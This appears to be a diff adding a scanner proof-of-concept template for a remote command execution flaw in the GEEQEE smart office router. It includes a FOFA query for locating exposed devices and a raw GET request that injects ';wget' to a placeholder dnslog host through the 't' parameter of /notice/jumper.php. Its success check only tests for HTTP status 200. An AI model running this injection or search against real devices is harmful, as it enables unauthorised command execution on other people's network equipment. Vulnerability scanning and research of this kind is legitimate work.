@@ -1,0 +1,23 @@
+id: poc-tcdp1nnbiv6ldcd4
+info:
+  name: 极企智能办公路由某接口存在RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tcdp1nnbiv6ldcd4'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tcdp1nnbiv6ldcd4
+    fofa: app="GEEQEE-极企智能办公路由"
+http:
+- raw:
+  - 'GET /notice/jumper.php?t=;wget%20http://xxx.dnslog.cn HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
